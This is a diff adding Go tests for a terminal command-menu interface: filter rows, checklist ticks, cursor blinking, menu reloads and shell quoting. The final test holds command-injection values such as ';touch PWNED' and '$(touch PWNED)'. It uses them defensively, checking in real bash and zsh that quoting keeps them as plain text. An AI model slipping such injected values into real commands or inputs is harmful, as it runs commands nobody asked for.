+	m := New(Options{Config: &config.Config{Sections: []config.Section{
+		{Name: "Git", Icon: "•", Category: "Code", Commands: []config.Command{{Name: "Status", Cmd: "git status"}}},
+		{Name: "Pg", Icon: "•", Category: "Databases", Commands: []config.Command{{Name: "Connect", Cmd: "psql"}}},
+	}}, Send: func(string) error { return nil }, Builtin: func() []*config.Section {
+		return []*config.Section{
+			{Name: "Packs", Icon: "•", Category: "Clingon", Commands: []config.Command{{Name: "p", Cmd: "p"}}},
+			{Name: CommandLineSection, Icon: "•", Category: config.CommandLine, Groups: []config.Group{{Name: "Custom", Commands: []config.Command{{Name: "Type a command", Cmd: "<c>", Args: []config.Arg{{Name: "c"}}}}}}},
+		}
+	}})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	m.showRoot("")
+	var rows []string
+	for _, it := range m.list.view {
+		if it.title != "" {
+			rows = append(rows, it.title)
+		}
+	}
+	if got, want := strings.Join(rows, ","), "Code,Git,Command Line,Commands,Databases,Pg,Clingon,Packs"; got != want {
+		t.Errorf("rows %s, want %s", got, want)
+	}
+	for i, it := range m.list.view {
+		if it.title == CommandLineSection {
+			m.list.cursor = i
+		}
+	}
+	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
+	view := ansi.Strip(m.view())
+	if !strings.Contains(view, "Command Line ›") || !strings.Contains(view, "CUSTOM") || !strings.Contains(view, "Type a command") {
+		t.Errorf("view:\n%s", view)
+	}
+}
+
+// The filter's row is on every screen, greyed out where it can't be used, so
+// nothing below it moves.
+func TestTheFilterRowNeverMoves(t *testing.T) {
+	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
+		{Name: "a text", Cmd: "x <p>", Args: []config.Arg{{Name: "p"}}},
+		{Name: "b list", Cmd: "y <q>", Args: []config.Arg{{Name: "q", Options: []config.Option{{Value: "one"}, {Value: "two"}}}}},
+		{Name: "c risky", Cmd: "z", Risk: config.RiskWarn},
+	}}}}, Send: func(string) error { return nil }, Shell: func() ShellState { return ShellState{} }, WaitIdle: func() bool { return true }})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	on := func(name string) {
+		t.Helper()
+		m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
+		m.mode, m.job, m.pending = modeBrowse, nil, nil
+		m.showSection(&m.opt.Config.Sections[0])
+		for i, it := range m.list.view {
+			if it.title == name {
+				m.list.cursor = i
+			}
+		}
+	}
+	rowOf := func(want string) int {
+		t.Helper()
+		for i, l := range strings.Split(ansi.Strip(m.view()), "\n") {
+			if strings.HasPrefix(strings.TrimSpace(strings.TrimPrefix(l, "▌")), want) {
+				return i
+			}
+		}
+		t.Fatalf("no %q:\n%s", want, ansi.Strip(m.view()))
+		return -1
+	}
+	on("a text")
+	filter := rowOf("❯ / to filter")
+	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
+	if got := rowOf("❯ / to filter"); got != filter {
+		t.Errorf("text blank: row %d, want %d", got, filter)
+	}
+	step := rowOf("Step 1 of 1")
+	// / goes in the box: it's a path as often as not.
+	m.Update(typed("/"))
+	if m.job.input.Value() != "/" {
+		t.Errorf("input %q", m.job.input.Value())
+	}
+	on("b list")
+	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
+	if got := rowOf("❯ / to filter"); got != filter {
+		t.Errorf("list: row %d, want %d", got, filter)
+	}
+	if got := rowOf("Step 1 of 1"); got != step {
+		t.Errorf("list's step: row %d, want %d", got, step)
+	}
+	on("c risky")
+	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
+	if m.mode != modeConfirm {
+		t.Fatalf("mode %v", m.mode)
+	}
+	if got := rowOf("❯ / to filter"); got != filter {
+		t.Errorf("prompt: row %d, want %d", got, filter)
+	}
+	on("a text")
+	m.Update(typed("?"))
+	if got := rowOf("❯ / to filter"); got != filter {
+		t.Errorf("help: row %d, want %d", got, filter)
+	}
+	m.Update(typed("x"))
+	// The whole view keeps to the window.
+	if got := len(strings.Split(m.view(), "\n")); got != 40 {
+		t.Errorf("view is %d lines", got)
+	}
+}
+
+// A checklist that needs a tick won't go on without one.
+func TestAtLeastOneNeedsATick(t *testing.T) {
+	var sent []string
+	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
+		{Name: "add", Cmd: "add <p>", Desc: "Adds <p>.", Args: []config.Arg{{Name: "p", Type: "flags", AtLeastOne: true, Options: []config.Option{{Value: "a", Label: "Alpha"}, {Value: "b", Label: "Beta"}}}}},
+	}}}}, Send: func(c string) error { sent = append(sent, c); return nil }, Shell: func() ShellState { return ShellState{} }, WaitIdle: func() bool { return true }})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	m.showSection(&m.opt.Config.Sections[0])
+	m.list.cursor = 1
+	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
+	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
+	if m.mode != modeFill || len(sent) != 0 || !strings.Contains(m.hint, "tick at least one") {
+		t.Fatalf("mode %v, sent %v, hint %q", m.mode, sent, m.hint)
+	}
+	m.Update(tea.KeyPressMsg{Code: tea.KeySpace})
+	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
+	m.Update(tea.KeyPressMsg{Code: tea.KeySpace})
+	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
+	if len(sent) != 1 || sent[0] != "add a b" {
+		t.Fatalf("sent %v", sent)
+	}
+}
+
+// / closes a filter and keeps it; only esc, ctrl-c or ← throws it away. The same
+// in the menu's list and an arg's.
+func TestSlashKeepsTheFilter(t *testing.T) {
+	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
+		{Name: "apple", Cmd: "a"}, {Name: "banana", Cmd: "b"},
+		{Name: "pick", Cmd: "pick <x>", Args: []config.Arg{{Name: "x", Options: []config.Option{{Value: "red"}, {Value: "blue"}}}}},
+		{Name: "many", Cmd: "many <y>", Args: []config.Arg{{Name: "y", Type: "flags", Options: []config.Option{{Value: "red"}, {Value: "blue"}}}}},
+	}}
+	var sent []string
+	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, Send: func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true }, Shell: func() ShellState { return ShellState{} }})
+	m.Update(tea.WindowSizeMsg{Width: 70, Height: 40})
+	m.showSection(&m.opt.Config.Sections[0])
+	esc := tea.KeyPressMsg{Code: tea.KeyEscape}
+	m.Update(typed("/"))
+	m.Update(typed("ban"))
+	m.Update(typed("/"))
+	if m.list.filtering || m.list.query() != "ban" || m.list.selected().title != "banana" {
+		t.Fatalf("filtering %v, query %q", m.list.filtering, m.list.query())
+	}
+	view := ansi.Strip(m.view())
+	if !strings.Contains(view, "❯ ban") || !strings.Contains(view, "esc to clear") || strings.Contains(view, "apple") {
+		t.Errorf("the filter should still show, and apply:\n%s", view)
+	}
+	if bar := ansi.Strip(m.statusBar(120)); !strings.Contains(bar, "/ edit filter") || !strings.Contains(bar, "esc clear filter") {
+		t.Errorf("bar %q", bar)
+	}
+	// Coming back to the menu doesn't throw it away.
+	m.lookAgain()
+	if m.list.query() != "ban" {
+		t.Errorf("query %q", m.list.query())
+	}
+	// / opens it again, as it was, to carry on typing.
+	m.Update(typed("/"))
+	m.Update(typed("a"))
+	if !m.list.filtering || m.list.query() != "bana" {
+		t.Errorf("filtering %v, query %q", m.list.filtering, m.list.query())
+	}
+	m.Update(typed("/"))
+	// esc clears it, and goes no further: esc again would leave.
+	m.Update(esc)
+	if m.list.filtered() || m.section == nil || len(m.list.view) < 4 {
+		t.Errorf("esc should clear it: filtered %v, section %v", m.list.filtered(), m.section)
+	}
+	// Nothing typed: / just closes it.
+	m.Update(typed("/"))
+	m.Update(typed("/"))
+	if m.list.filtered() {
+		t.Error("an empty filter is no filter")
+	}
+
+	// In an arg's list too, ticks surviving.
+	for i, it := range m.list.view {
+		if it.title == "many" {
+			m.list.cursor = i
+		}
+	}
+	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
+	m.Update(typed("/"))
+	m.Update(typed("blu"))
+	m.Update(tea.KeyPressMsg{Code: tea.KeySpace})
+	m.Update(typed("/"))
+	if m.job.pick.filtering || m.job.pick.query() != "blu" || len(m.job.pick.values()) != 1 {
+		t.Fatalf("filtering %v, query %q, values %v", m.job.pick.filtering, m.job.pick.query(), m.job.pick.values())
+	}
+	if f := ansi.Strip(m.footer(70)); !strings.Contains(f, "/ edit filter") {
+		t.Errorf("footer %q", f)
+	}
+	m.Update(esc)
+	if m.mode != modeFill || m.job.pick.filtered() || len(m.job.pick.values()) != 1 {
+		t.Errorf("esc clears the filter, not the ticks or the command: mode %v, values %v", m.mode, m.job.pick.values())
+	}
+}
+
+// Ticking a parent ticks what's under it, and it counts once: the whole thing.
+func TestTickingAParentTicksItsChildren(t *testing.T) {
+	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
+		{Name: "add", Cmd: "add <p>", Args: []config.Arg{{Name: "p", Type: "flags", Options: []config.Option{
+			{Value: "aws", Label: "All of AWS"}, {Value: "aws/ecs", Label: "ECS", Indent: true}, {Value: "aws/s3", Label: "S3", Indent: true},
+			{Value: "go", Label: "Go"},
+		}}}},
+	}}}}, Send: func(string) error { return nil }})
+	m.Update(tea.WindowSizeMsg{Width: 70, Height: 40})
+	m.showSection(&m.opt.Config.Sections[0])
+	m.list.cursor = 1
+	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
+	space := tea.KeyPressMsg{Code: tea.KeySpace}
+	down := tea.KeyPressMsg{Code: tea.KeyDown}
+	up := tea.KeyPressMsg{Code: tea.KeyUp}
+	vals := func() string { return strings.Join(m.job.pick.values(), " ") }
+	marks := func() string {
+		var out []string
+		for _, l := range strings.Split(ansi.Strip(m.fillView(70, 20)), "\n") {
+			if strings.Contains(l, "aws") || strings.Contains(l, "go") {
+				out = append(out, strings.Fields(strings.TrimPrefix(l, "▌"))[0])
+			}
+		}
+		return strings.Join(out, " ")
+	}
+	m.Update(space) // aws
+	if got := vals(); got != "aws" {
+		t.Errorf("the whole of it, once: %q", got)
+	}
+	if got := marks(); got != "✓ ✓ ✓ •" {
+		t.Errorf("marks %q", got)
+	}
+	if !strings.Contains(m.job.optionSays(), "All of AWS") || strings.Contains(m.job.optionSays(), "ECS") {
+		t.Errorf("says %q", m.job.optionSays())
+	}
+	// Unticking a child unticks the parent, and leaves the other child.
+	m.Update(down)
+	m.Update(space) // aws/ecs off
+	if got := vals(); got != "aws/s3" {
+		t.Errorf("got %q", got)
+	}
+	if got := marks(); got != "− • ✓ •" {
+		t.Errorf("part of it should show: %q", got)
+	}
+	// Ticking the last child completes the parent.
+	m.Update(space) // aws/ecs on
+	if got := vals(); got != "aws" {
+		t.Errorf("got %q", got)
+	}
+	// Unticking the parent unticks everything.
+	m.Update(up)
+	m.Update(space)
+	if got := vals(); got != "" {
+		t.Errorf("got %q", got)
+	}
+	// A pack with nothing under it is just itself; ticks survive going back.
+	m.Update(down)
+	m.Update(down)
+	m.Update(down)
+	m.Update(space)
+	if got := vals(); got != "go" {
+		t.Errorf("got %q", got)
+	}
+}
+
+// Past a couple of ticks a description counts them, and says about the one you're on.
+func TestALongChecklistCountsItsTicks(t *testing.T) {
+	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
+		{Name: "add", Cmd: "add <p>", Desc: "Installs for <p>.", Args: []config.Arg{{Name: "p", Type: "flags", CountAs: "pack", Options: []config.Option{
+			{Value: "aws", Label: "Cloud things"}, {Value: "aws/ecs", Label: "Containers", Indent: true}, {Value: "aws/s3", Label: "Buckets", Indent: true},
+			{Value: "git", Label: "Version control"}, {Value: "go", Label: "A language"}, {Value: "node", Label: "Another one"},
+		}}}},
+	}}}}, Send: func(string) error { return nil }})
+	m.Update(tea.WindowSizeMsg{Width: 70, Height: 40})
+	m.showSection(&m.opt.Config.Sections[0])
+	m.list.cursor = 1
+	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
+	space, down := tea.KeyPressMsg{Code: tea.KeySpace}, tea.KeyPressMsg{Code: tea.KeyDown}
+	desc := func() string { return ansi.Strip(m.job.describe()) }
+	m.Update(space) // aws, and all of it counts once
+	if got := desc(); got != "Installs for aws. Cloud things." {
+		t.Errorf("one: %q", got)
+	}
+	m.Update(down)
+	m.Update(down)
+	m.Update(down) // git
+	m.Update(space)
+	if got := desc(); got != "Installs for aws git. Cloud things, Version control." {
+		t.Errorf("two are still named: %q", got)
+	}
+	m.Update(down) // go
+	m.Update(space)
+	if got := desc(); got != "Installs for 3 packs. A language." {
+		t.Errorf("three are counted: %q", got)
+	}
+	m.Update(down) // node, not ticked: what space would add, once
+	if got := desc(); got != "Installs for 3 packs. Space adds: Another one." {
+		t.Errorf("on an unticked one: %q", got)
+	}
+	if got := strings.Join(m.job.pick.values(), " "); got != "aws git go" {
+		t.Errorf("the command still has them all: %q", got)
+	}
+	// Once chosen, as on a risky command's prompt, there's no one you're on.
+	if got := describe(m.job.ref.cmd, map[string]string{"p": "aws git go"}, map[string]string{"p": "Cloud things, Version control, A language"}, 1, "", ""); got != "Installs for 3 packs." {
+		t.Errorf("chosen: %q", got)
+	}
+}
+
+// A cursor blinks where there's one to see, and nothing ticks where there isn't.
+func TestCursorsBlink(t *testing.T) {
+	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
+		{Name: "a text", Cmd: "x <p>", Args: []config.Arg{{Name: "p"}}},
+		{Name: "b list", Cmd: "y <q>", Args: []config.Arg{{Name: "q", Options: []config.Option{{Value: "one"}}}}},
+	}}}}, Send: func(string) error { return nil }})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	m.showSection(&m.opt.Config.Sections[0])
+	if m.list.filter.Focused() {
+		t.Error("a closed filter has no cursor")
+	}
+	if _, cmd := m.Update(tea.FocusMsg{}); cmd != nil {
+		if msg := cmd(); msg != nil {
+			if b, ok := msg.(tea.BatchMsg); ok && len(b) > 0 {
+				t.Errorf("coming back to a list with its filter closed shouldn't start a blink: %d commands", len(b))
+			}
+		}
+	}
+	if _, cmd := m.Update(typed("/")); cmd == nil || !m.list.filter.Focused() {
+		t.Error("/ should start its cursor")
+	}
+	m.Update(typed("a"))
+	if m.list.query() != "a" {
+		t.Errorf("query %q", m.list.query())
+	}
+	m.Update(typed("/"))
+	if m.list.filter.Focused() {
+		t.Error("closing it should stop its cursor")
+	}
+	if _, cmd := m.Update(typed("/")); cmd == nil || !m.list.filter.Focused() {
+		t.Error("/ should start it again")
+	}
+	m.Update(typed("b"))
+	if m.list.query() != "ab" {
+		t.Errorf("typing should carry on: %q", m.list.query())
+	}
+	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
+	if m.list.filter.Focused() {
+		t.Error("clearing it should stop its cursor")
+	}
+	if m.list.cursor = 1; m.list.selected().title != "a text" {
+		t.Fatalf("on %q", m.list.selected().title)
+	}
+	if _, cmd := m.Update(tea.KeyPressMsg{Code: tea.KeyRight}); cmd == nil || !m.job.input.Focused() {
+		t.Error("a text blank should start its cursor")
+	}
+	// It stops when focus leaves the menu, and starts again when it's back.
+	m.Update(tea.BlurMsg{})
+	if m.job.input.Focused() {
+		t.Error("only the focused pane's cursor blinks")
+	}
+	if _, cmd := m.Update(tea.FocusMsg{}); cmd == nil || !m.job.input.Focused() {
+		t.Error("coming back should start it again")
+	}
+	// A key can say focus is back before any focus event does.
+	m.Update(tea.BlurMsg{})
+	if _, cmd := m.Update(typed("z")); cmd == nil || !m.job.input.Focused() || m.job.input.Value() != "z" {
+		t.Errorf("a key should bring it back too: focused %v, value %q", m.job.input.Focused(), m.job.input.Value())
+	}
+}
+
+// Each blank says how to answer it.
+func TestBlanksSayHowToAnswer(t *testing.T) {
+	for want, a := range map[string]config.Arg{
+		"type":          {Name: "x"},
+		"↑↓ to choose":  {Name: "x", Options: []config.Option{{Value: "a"}}},
+		"space to tick": {Name: "x", Type: "flags", Options: []config.Option{{Value: "a"}}},
+	} {
+		if got := inputHint(a); got != want {
+			t.Errorf("%+v: %q, want %q", a, got, want)
+		}
+	}
+	if got := inputHint(config.Arg{Name: "x", Type: "secret"}); got != "type" {
+		t.Errorf("secret: %q", got)
+	}
+}
+
+// A command from the menu can change what the menu should show, and focus never
+// leaves the menu for it: its finishing is what brings the menu up to date.
+func TestAFinishedCommandBringsTheMenuUpToDate(t *testing.T) {
+	section := func(name string) config.Section {
+		return config.Section{Name: name, Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "run " + name, Cmd: name}}}
+	}
+	repo, elsewhere := t.TempDir(), t.TempDir()
+	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	dir := repo
+	var next *config.Config
+	first := section("Old")
+	first.Commands = append(first.Commands, config.Command{Name: "needs git", Cmd: "x", When: []string{".git"}})
+	m := New(Options{Config: &config.Config{Sections: []config.Section{first}},
+		Send: func(string) error { return nil }, WaitIdle: func() bool { return true }, Shell: func() ShellState { return ShellState{} },
+		Dir:    func() string { return dir },
+		Reload: func() (*config.Config, error) { c := next; next = nil; return c, nil }})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	m.showRoot("")
+	titles := func() string {
+		var out []string
+		for _, it := range m.list.view {
+			if !it.header {
+				out = append(out, it.title)
+			}
+		}
+		return strings.Join(out, ",")
+	}
+	if titles() != "Old" {
+		t.Fatalf("titles %q", titles())
+	}
+	// No focus event at all: the command just finishes.
+	next = &config.Config{Sections: []config.Section{section("New")}}
+	if err := next.Validate(); len(err) > 0 {
+		t.Fatal(err)
+	}
+	m.busy = "x"
+	m.Update(idleMsg{seq: m.runSeq, ok: true})
+	if titles() != "New" {
+		t.Errorf("after the command finished: %q", titles())
+	}
+	// Nor does a cd need one, to grey out what no longer fits.
+	m.opt.Config = &config.Config{Sections: []config.Section{first}}
+	m.showSection(&m.opt.Config.Sections[0])
+	grey := func() bool {
+		for _, it := range m.list.view {
+			if it.title == "needs git" {
+				return it.disabled
+			}
+		}
+		t.Fatal("no row")
+		return false
+	}
+	if grey() {
+		t.Fatal("it fits here")
+	}
+	dir = elsewhere
+	m.busy = "cd"
+	m.Update(idleMsg{seq: m.runSeq, ok: true})
+	if !grey() {
+		t.Error("after a cd it should be greyed out")
+	}
+}
+
+// A ~/ stays your home even when the rest of a path needs quoting, and nothing in
+// the value gets to be more than text. Checked by what real shells make of it.
+func TestShellValueKeepsHomeAndNothingElse(t *testing.T) {
+	home := t.TempDir()
+	for value, want := range map[string]string{
+		"plain":             "plain",
+		"two words":         "two words",
+		"~":                 home,
+		"~/bin":             home + "/bin",
+		"~/my dir":          home + "/my dir",
+		"~/it's mine/x y":   home + "/it's mine/x y",
+		"~/a;touch PWNED;b": home + "/a;touch PWNED;b",
+		"~/$(touch PWNED)":  home + "/$(touch PWNED)",
+		"~/`touch PWNED`":   home + "/`touch PWNED`",
+		"not/~/my dir":      "not/~/my dir",
+		"~ and more":        "~ and more",
+		";touch PWNED":      ";touch PWNED",
+		"$(touch PWNED)":    "$(touch PWNED)",
+		"it's":              "it's",
+	} {
+		quoted := shellValue(value)
+		for _, sh := range [][]string{{"bash", "--noprofile", "--norc"}, {"zsh", "-f"}} {
+			if _, err := exec.LookPath(sh[0]); err != nil {
+				continue
+			}
+			c := exec.Command(sh[0], append(sh[1:], "-c", "printf %s "+quoted)...)
+			c.Dir, c.Env = home, []string{"HOME=" + home, "PATH=/usr/bin:/bin"}
+			got, err := c.Output()
+			if err != nil {
+				t.Errorf("%s: %q as %s: %v", sh[0], value, quoted, err)
+			}
+			if string(got) != want {
+				t.Errorf("%s: %q as %s gave %q, want %q", sh[0], value, quoted, got, want)
+			}
+		}
+	}
+	if _, err := os.Stat(filepath.Join(home, "PWNED")); err == nil {
+		t.Error("something in a value ran")
+	}
+	// A recipe's name isn't a path: it's always plain text.
+	if got := shellQuote("~/my flow"); got != "'~/my flow'" {
+		t.Errorf("shellQuote %q", got)
 	}
 }
